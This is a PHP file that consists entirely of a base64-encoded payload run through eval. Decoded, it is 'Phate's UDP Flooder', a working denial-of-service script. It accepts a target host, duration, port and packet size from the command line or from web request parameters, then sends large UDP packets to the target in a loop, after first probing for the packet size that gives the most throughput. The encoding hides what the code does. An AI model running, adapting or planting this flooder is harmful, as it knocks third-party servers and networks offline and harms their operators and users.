<?php eval(base64_decode('Pz48P3BocAovKgpQVUY6IFBoYXRlJ3MgVURQIEZsb29kZXIgVjEuMC4xMAoKTW9yZSBpbmZvL2xhdGVzdCB2ZXJzaW9uOiAKaHR0cHM6Ly9naXRodWIuY29tL3VkcC1mbG9vZGVyL3B1ZgoKVGhlIE1JVCBMaWNlbnNlIChNSVQpCgpDb3B5bGVmdCAoYykgMjAxMyBQaGF0ZSB+IGdpdGh1Yi5jb20vdWRwLWZsb29kZXIvCgpQZXJtaXNzaW9uIGlzIGhlcmVieSBncmFudGVkLCBmcmVlIG9mIGNoYXJnZSwgdG8gYW55IHBlcnNvbiBvYnRhaW5pbmcgYSBjb3B5IG9mCnRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlICJTb2Z0d2FyZSIpLCB0byBkZWFsIGluCnRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcgd2l0aG91dCBsaW1pdGF0aW9uIHRoZSByaWdodHMgdG8KdXNlLCBjb3B5LCBtb2RpZnksIG1lcmdlLCBwdWJsaXNoLCBkaXN0cmlidXRlLCBzdWJsaWNlbnNlLCBhbmQvb3Igc2VsbCBjb3BpZXMgb2YKdGhlIFNvZnR3YXJlLCBhbmQgdG8gcGVybWl0IHBlcnNvbnMgdG8gd2hvbSB0aGUgU29mdHdhcmUgaXMgZnVybmlzaGVkIHRvIGRvIHNvLApzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczoKClRoZSBhYm92ZSBjb3B5cmlnaHQgbm90aWNlIGFuZCB0aGlzIHBlcm1pc3Npb24gbm90aWNlIHNoYWxsIGJlIGluY2x1ZGVkIGluIGFsbApjb3BpZXMgb3Igc3Vic3RhbnRpYWwgcG9ydGlvbnMgb2YgdGhlIFNvZnR3YXJlLgoKVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEICJBUyBJUyIsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1MgT1IKSU1QTElFRCwgSU5DTFVESU5HIEJVVCBOT1QgTElNSVRFRCBUTyBUSEUgV0FSUkFOVElFUyBPRiBNRVJDSEFOVEFCSUxJVFksIEZJVE5FU1MKRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFIEFORCBOT05JTkZSSU5HRU1FTlQuIElOIE5PIEVWRU5UIFNIQUxMIFRIRSBBVVRIT1JTIE9SCkNPUFlSSUdIVCBIT0xERVJTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLCBEQU1BR0VTIE9SIE9USEVSIExJQUJJTElUWSwgV0hFVEhFUgpJTiBBTiBBQ1RJT04gT0YgQ09OVFJBQ1QsIFRPUlQgT1IgT1RIRVJXSVNFLCBBUklTSU5HIEZST00sIE9VVCBPRiBPUiBJTgpDT05ORUNUSU9OIFdJVEggVEhFIFNPRlRXQVJFIE9SIFRIRSBVU0UgT1IgT1RIRVIgREVBTElOR1MgSU4gVEhFIFNPRlRXQVJFLgoqLwoKJHZlcnNpb24gPSAnMS4wLjEwJzsgJGZpbGUgPSBlbmQoZXhwbG9kZShESVJFQ1RPUllfU0VQQVJBVE9SLCBfX0ZJTEVfXykpOyAkY2FjaGUgPSB0cnVlOyAkY2FjaGVEYXRhID0gYXJyYXkoKTsKCi8vIERldGVybWluZSB3ZWIvQ0xJCmlmIChkZWZpbmVkKCdQSFBfU0FQSScpIHx8IGZ1bmN0aW9uX2V4aXN0cygncGhwX3NhcGlfbmFtZScpKSB7CiAgICBpZiAoUEhQX1NBUEkgPT0gJ2NsaScgfHwgcGhwX3NhcGlfbmFtZSgpID09ICdjbGknKSB7CiAgICAgICAgZWNobyAnPT09PT09PT09PT09PT09PT09PT09PT09PT09JyAuIFBIUF9FT0w7CiAgICAgICAgZWNobyAnUGhhdGVcJ3MgVURQIEZsb29kZXIgVicgLiAkdmVyc2lvbiAuIFBIUF9FT0w7CiAgICAgICAgJGNsaSA9IHRydWU7CiAgICAgICAgJGFyZ3MgPSAkX1NFUlZFUlsnYXJndiddOwogICAgICAgIGlmICgkX1NFUlZFUlsnYXJnYyddID09IDEgfHwgJGFyZ3NbMV0gPT0gJy1oJyB8fCAkYXJnc1sxXSA9PSAnLWhlbHAnKSB7CiAgICAgICAgICAgIGVjaG8gJ1VzYWdlOicgLiBQSFBfRU9MOwogICAgICAgICAgICBlY2hvICRmaWxlIC4gJyBbaG9zdC9pcF0gW3RpbWU9MzAwXSBbcG9ydD1yYW5kb21dIFtzaXplPW9wdGltaXNlZC9jYWNoZV0nIC4gUEhQX0VPTCAuIFBIUF9FT0w7CiAgICAgICAgICAgIGVjaG8gJGZpbGUgLiAnIChzaG93cyB0aGlzKScgLiBQSFBfRU9MOwogICAgICAgICAgICBlY2hvICRmaWxlIC4gJyAxLjIuMy40IChmbG9vZHMgaG9zdCBmb3IgMzAwIHNlY29uZHMgb24gcmFuZG9tIHBvcnRzKScgLiBQSFBfRU9MOwogICAgICAgICAgICBlY2hvICRmaWxlIC4gJyAxLjIuMy40IDYwIChmbG9vZHMgaG9zdCBmb3IgNjAgc2Vjb25kcyBvbiByYW5kb20gcG9ydHMpJzsKICAgICAgICAgICAgZWNobyAkZmlsZSAuICcgMS4yLjMuNCAwIDgwIChmbG9vZHMgaG9zdCBvbiBmaXhlZCBwb3J0LCBpbmRlZmluaXRseSknOwogICAgICAgICAgICBlY2hvICRmaWxlIC4gJyAxLjIuMy40IDMwMCA4MCAyNTAwMCAoZmxvb2RzIGhvc3QgZm9yIDMwMCBzZWNvbmRzIG9uIGZpeGVkIHBvcnQgd2l0aCBmaXhlZCBwYWNrZXQtc2l6ZSwgZGlzYWJsaW5nIG9wdGltaXNlZCBzcGVlZCknIC4gUEhQX0VPTDsKICAgICAgICAgICAgZWNobyAkZmlsZSAuICcgaG9zdC5pbyAwIDAgMzUwMDAgKGZsb29kcyBob3N0IG9uIHJhbmRvbSBwb3J0IHdpdGggZml4ZWQgcGFja2V0LXNpemUsIGRpc2FibGluZyBvcHRpbWlzZWQgc3BlZWQsIGluZGVmaW5pdGx5KScgLiBQSFBfRU9MOwogICAgICAgICAgICBlY2hvICRmaWxlIC4gJyBob3N0LmlvIC1ub2NhY2hlIChvcHRpbWlzZWQgc3BlZWQgd2l0aG91dCBjYWNoZSknIC4gUEhQX0VPTDsKICAgICAgICAgICAgZWNobyAkZmlsZSAuICcgLXNob3djYWNoZSAoc2hvd3Mgb3B0aW1pc2VkIHNwZWVkL2Zyb20gY2FjaGUpJyAuIFBIUF9FT0w7CiAgICAgICAgICAgIGVjaG8gJz09PT09PT09PT09PT09PT09PT09PT09PT09PScgLiBQSFBfRU9MOwogICAgICAgICAgICBleGl0KDApOwogICAgICAgIH0KICAgIH0KfQppZiAoIWlzc2V0KCRjbGkpKSB7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgICRjbGkgPSBmYWxzZTsKICAgIEBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJywgJ29mZicpOwogICAgQGluaV9zZXQoJ3psaWIub3V0cHV0X2J1ZmZlcmluZycsIGZhbHNlKTsKICAgIEBpbmlfc2V0KCd6bGliLm91dHB1dF9jb21wcmVzc2lvbicsIGZhbHNlKTsKICAgIEBpbmlfc2V0KCdpbXBsaWNpdF9mbHVzaCcsIHRydWUpOwogICAgZm9yICgkb2IgPSAwOyAkb2IgPCBvYl9nZXRfbGV2ZWwoKTsgJG9iKyspIHsKICAgICAgICBvYl9lbmRfZmx1c2goKTsKICAgIH0KICAgIG9iX2ltcGxpY2l0X2ZsdXNoKHRydWUpOwogICAgaGVhZGVyKCdDb250ZW50LXR5cGU6IHRleHQvcGxhaW4nKTsKICAgIGhlYWRlcignQ2FjaGUtY29udHJvbDogbm8tY2FjaGUnKTsKICAgIGVjaG8gc3RyX3JlcGVhdCgnICcsIDEwMjQpIC4gUEhQX0VPTDsgLy8gZml4ZXMgYnVncwp9CgppZiAoJGNsaSkgewogICAgZm9yICgkaSA9IDE7ICRpIDwgY291bnQoJGFyZ3MpOyAkaSsrKSB7CiAgICAgICAgaWYgKHRyaW0oJGFyZ3NbJGldKSA9PSAnLW5vY2FjaGUnKSB7CiAgICAgICAgICAgICRjYWNoZSA9IGZhbHNlOwogICAgICAgICAgICBlY2hvICctIGNhY2hlIGRpc2FibGVkJyAuIFBIUF9FT0w7CiAgICAgICAgfQogICAgICAgIGlmICh0cmltKCRhcmdzWyRpXSkgPT0gJy1zaG93Y2FjaGUnKSB7CiAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygkZmlsZSAuICcuZGF0JykpIHsKICAgICAgICAgICAgICAgIGV4aXQoZmlsZV9nZXRfY29udGVudHMoJGZpbGUgLiAnLmRhdCcpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBleGl0KCdObyBjYWNoZSBhdmFpbGFibGUnKTsKICAgICAgICB9CiAgICB9Cn0gICAKZWxzZSB7CiAgICBpZiAoaXNzZXQoJGFyZ3NbJ25vY2FjaGUnXSkgJiYgJGFyZ3NbJ25vY2FjaGUnXSA9PSAneWVzJykgewogICAgICAgICRjYWNoZSA9IGZhbHNlOwogICAgfQp9CgppZiAoZmlsZV9leGlzdHMoJGZpbGUgLiAnLmRhdCcpKSB7CiAgICAkY2FjaGVEYXRhID0gZXhwbG9kZShQSFBfRU9MLCBmaWxlX2dldF9jb250ZW50cygkZmlsZSAuICcuZGF0JykpOwogICAgZm9yZWFjaCAoJGNhY2hlRGF0YSBhcyAkaW5kZXggPT4gJHZhbHVlKSB7CiAgICAgICAgJHRtcCA9IGV4cGxvZGUoJzsnLCAkdmFsdWUpOwogICAgICAgICRjYWNoZURhdGFbJGluZGV4XSA9ICR0bXBbMF07CiAgICB9Cn0KZWxzZSBpZiAoaXNzZXQoJF9TRVNTSU9OWydwdWZzaXplJ10pKSB7CiAgICAkY2FjaGVEYXRhW10gPSAkX1NFU1NJT05bJ3B1ZnNpemUnXTsKfQoKaWYgKCEkY2xpKSB7CiAgICAkYXJncyA9IGFycmF5KCk7CiAgICBpZiAoaXNzZXQoJF9SRVFVRVNUWydob3N0bmFtZSddKSkgewogICAgICAgICRhcmdzWzFdID0gJF9SRVFVRVNUWydob3N0bmFtZSddOwogICAgfQogICAgaWYgKGlzc2V0KCRfUkVRVUVTVFsndGltZSddKSkgewogICAgICAgICRhcmdzWzJdID0gJF9SRVFVRVNUWyd0aW1lJ107CiAgICB9CiAgICBpZiAoaXNzZXQoJF9SRVFVRVNUWydwb3J0J10pKSB7CiAgICAgICAgJGFyZ3NbM10gPSAkX1JFUVVFU1RbJ3BvcnQnXTsKICAgIH0KICAgIGlmIChpc3NldCgkX1JFUVVFU1RbJ3NpemUnXSkpIHsKICAgICAgICAkYXJnc1s0XSA9ICRfUkVRVUVTVFsnc2l6ZSddOwogICAgfQp9CgppZiAoY291bnQoJGFyZ3MpID49IDIpIHsKICAgICRob3N0ID0gJGFyZ3NbMV07CiAgICBpZiAoIWlzc2V0KCRhcmdzWzRdKSkgewogICAgICAgIGlmICgkY2FjaGUgJiYgZW1wdHkoJGNhY2hlRGF0YSkpIHsKICAgICAgICAgICAgZWNobyAnLSBubyBjYWNoZSBhdmFpbGFibGUnIC4gUEhQX0VPTDsKICAgICAgICAgICAgZWNobyAnLSBjcmVhdGluZyBvbmUgdGFrZXMgYSBmZXcgc2Vjb25kcywgaG9sZCBvbicgLiBQSFBfRU9MOwogICAgICAgICAgICBpZiAoISRjbGkpIHsKICAgICAgICAgICAgICAgIGZsdXNoKCk7CiAgICAgICAgICAgICAgICBvYl9mbHVzaCgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgJHNpemUgPSBpc3NldCgkYXJnc1s0XSkgPyBpbnR2YWwoJGFyZ3NbNF0pIDogZ2V0U2l6ZSgpOwogICAgJHN0cnQgPSB0aW1lKCk7CiAgICAkdGltZSA9IChpc3NldCgkYXJnc1syXSkgPyBpbnR2YWwoJGFyZ3NbMl0pIDogMzAwKTsKICAgICRteHRtID0gdGltZSgpICsgJHRpbWU7CiAgICAkcG9ydCA9IGlzc2V0KCRhcmdzWzNdKSA/IGludHZhbCgkYXJnc1szXSkgOiAwOwogICAgJHBja3MgPSAkbGFzdCA9IDA7CiAgICAkcGNrdCA9IHN0cl9yZXBlYXQoJ1AnLCAkc2l6ZSk7CiAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgICR0aW1lID0gKHRpbWUoKSAtICRzdHJ0KTsKICAgICAgICBpZiAodGltZSgpID49ICRteHRtKSB7CiAgICAgICAgICAgIGVjaG8gc3RyX3BhZChAcm91bmQoJHBja3MgLyAkdGltZSwgMiksIDE1KSAuICJwL3MgICAgIFx0IiAuIHN0cl9wYWQoQHJvdW5kKCgoKCRwY2tzICogJHNpemUpIC8gMTAyNCkgLyAxMDI0KSAvICR0aW1lLCAyKSwgNykgLiAiTUIvcyAgICBcdCAiIC4gc3RyX3BhZCgoJG14dG0gLSB0aW1lKCkpLCA1KSAuIiBzZWNvbmRzIGxlZnQgICAgIiAuIFBIUF9FT0w7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICAkcGNrcysrOwogICAgICAgICR0cG9ydCA9ICRwb3J0OwogICAgICAgIGlmICghJHBvcnQpIHsKICAgICAgICAgICAgJHRwb3J0ID0gcmFuZCgyMSwgNjUwMjQpOwogICAgICAgIH0KICAgICAgICAkZnAgPSBAZnNvY2tvcGVuKCd1ZHA6Ly8nIC4gJGhvc3QsICR0cG9ydCwgJGVybiwgJGVycywgMSk7CiAgICAgICAgaWYgKCRmcCkgewogICAgICAgICAgICBmd3JpdGUoJGZwLCAkcGNrdCk7CiAgICAgICAgICAgIGZjbG9zZSgkZnApOwogICAgICAgIH0KICAgICAgICBpZiAoJGxhc3QgIT0gdGltZSgpKSB7CiAgICAgICAgICAgIGVjaG8gc3RyX3BhZChAcm91bmQoJHBja3MgLyAkdGltZSwgMiksIDE1KSAuICJwL3MgICAgIFx0IiAuIHN0cl9wYWQoQHJvdW5kKCgoKCRwY2tzICogJHNpemUpIC8gMTAyNCkgLyAxMDI0KSAvICR0aW1lLCAyKSwgNykgLiAiTUIvcyAgICBcdCAiIC4gc3RyX3BhZCgoJG14dG0gLSB0aW1lKCkpLCA1KSAuIiBzZWNvbmRzIGxlZnQgICAgXHIiOwogICAgICAgICAgICBpZiAoISRjbGkpIHsKICAgICAgICAgICAgICAgIGVjaG8gUEhQX0VPTDsKICAgICAgICAgICAgICAgIGZsdXNoKCk7CiAgICAgICAgICAgICAgICBvYl9mbHVzaCgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRsYXN0ID0gdGltZSgpOwogICAgICAgIH0KICAgIH0KICAgIGlmICgkY2xpKSB7CiAgICAgICAgZXhpdChQSFBfRU9MIC4gJz09PT09PT09PT09PT09PT09PT09PT09PT09PScgLiBQSFBfRU9MKTsKICAgIH0KfQoKZnVuY3Rpb24gZ2V0U2l6ZSgpIHsKICAgIGdsb2JhbCAkY2xpLCAkY2FjaGVEYXRhLCAkZmlsZSwgJGhvc3Q7CiAgICAKICAgIGlmICgkY2xpKSB7CiAgICAgICAgaWYgKCFlbXB0eSgkY2FjaGVEYXRhWzJdKSkgewogICAgICAgICAgICByZXR1cm4gJGNhY2hlRGF0YVsyXTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBpZiAoIWVtcHR5KCRfU0VTU0lPTlsncHVmc2l6ZSddKSkgewogICAgICAgICAgICByZXR1cm4gJF9TRVNTSU9OWydwdWZzaXplJ107CiAgICAgICAgfQogICAgfQogICAgZWNobyAnW05PVElDRV0gUGVyZm9ybWluZyBzaXplLWNoZWNrLCB0aGlzIHRha2VzIGFib3V0IGEgbWludXRlLicgLiBQSFBfRU9MOwogICAgJHNpemUgPSA1MDAwOwogICAgJHNwZWVkID0gJz8nOwogICAgJGJlc3RzaXplID0gMDsKICAgICRiZXN0cGFja2V0cyA9IDA7CiAgICB3aGlsZSAoJHNpemUgPD0gNjUwMDApIHsKICAgICAgICAkZW5kID0gdGltZSgpICsgNTsKICAgICAgICAkcGFja2V0cyA9IDA7CiAgICAgICAgd2hpbGUgKHRydWUpIHsKICAgICAgICAgICAgaWYgKHRpbWUoKSA+ICRlbmQpIHsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRwYWNrYWdlID0gc3RyX3JlcGVhdCgnWCcsICRzaXplKTsKICAgICAgICAgICAgJGZwID0gQGZzb2Nrb3BlbigndWRwOi8vJyAuICRob3N0LCA4MCwgJGVybiwgJGVycywgMSk7CiAgICAgICAgICAgIGlmICgkZnApIHsKICAgICAgICAgICAgICAgIEBmd3JpdGUoJGZwLCAkcGFja2FnZSk7CiAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkcGFja2V0cysrOwogICAgICAgIH0KICAgICAgICAKICAgICAgICAkdG9CZWF0ID0gcm91bmQoICgkYmVzdHNpemUgKiAkYmVzdHBhY2tldHMpIC8gNSApOwogICAgICAgICRiZWF0TWUgPSByb3VuZCggKCRzaXplICogJHBhY2tldHMpIC8gNSApOwogICAgICAgICAkc3BlZWQgPSByb3VuZCAoKCRiZWF0TWUgLyAxMDI0KSAvIDEwMjQsIDIpOwogICAgICAgIGlmICgkYmVhdE1lID49ICR0b0JlYXQpIHsKICAgICAgICAgICAKICAgICAgICAgICAgZWNobyAnW1VwZGF0ZV0gTmV3IHNwZWVkOiAnIC4gJHNpemUgLiAnIGJ5dGVzLCAnIC4gJHBhY2tldHMgLiAnL3MsICcgLiAkc3BlZWQgLiAnTUIvcycgLiBQSFBfRU9MOwogICAgICAgICAgICAkYmVzdHNpemUgPSAkc2l6ZTsKICAgICAgICAgICAgJGJlc3RwYWNrZXRzID0gJHBhY2tldHM7CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBlY2hvICdbU2tpcHBpbmddICcgLiRzaXplIC4gJyBieXRlcywgJyAuICRwYWNrZXRzLiAnL3MsICcgLiAkc3BlZWQgLiAnTUIvcycgLiBQSFBfRU9MOwogICAgICAgIH0KICAgICAgICBzbGVlcCgxKTsKICAgICAgICAkc2l6ZSArPSA1MDAwOwogICAgfQogICAgCiAgICBpZiAoJGNsaSkgewogICAgICAgICRmcCA9IEBmb3BlbihzdHJfcmVwbGFjZSgncGhwJywgJ2RhdCcsICRmaWxlKSwgJ1cnKTsKICAgICAgICBpZiAoISRmcCkgewogICAgICAgICAgICBlY2hvICdbV0FSTklOR10gQ2FjaGUgZmlsZSBjb3VsZCBub3QgYmUgY3JlYXRlZC4gT3B0aW1pc2VkIHNpemUgaXMgJyAuICRiZXN0c2l6ZSAuICcgYXQgJyAuICR0b0JlYXQgLiAnIE1CL3MnIC4gUEhQX0VPTDsKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRmdyA9IGZ3cml0ZSgkZnAsICRiZXN0c2l6ZSAuICc7IHBhY2tldHMgcGVyIHJlcXVlc3QnIC4gUEhQX0VPTCAuICR0b0JlYXQgLiAnOyBNQi9zJyk7CiAgICAgICAgICAgIGlmICghJGZ3KSB7CiAgICAgICAgICAgICAgICBlY2hvICdbV0FSTklOR10gQ291bGQgbm90IHdyaXRlIHRvIGNhY2hlIGZpbGUuIE9wdGltaXNlZCBzaXplIGlzICcgLiAkYmVzdHNpemUgLiAnIGF0ICcgLiAkdG9CZWF0IC4gJyBNQi9zJyAuIFBIUF9FT0w7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgJF9TRVNTSU9OWydwdWZzaXplJ10gPSAkc2l6ZTsKICAgICAgICAkX1NFU1NJT05bJ3B1ZnNwZWVkJ10gPSAkc3BlZWQ7CiAgICB9CiAgICAKICAgIHJldHVybiAkc2l6ZTsKfQo='));
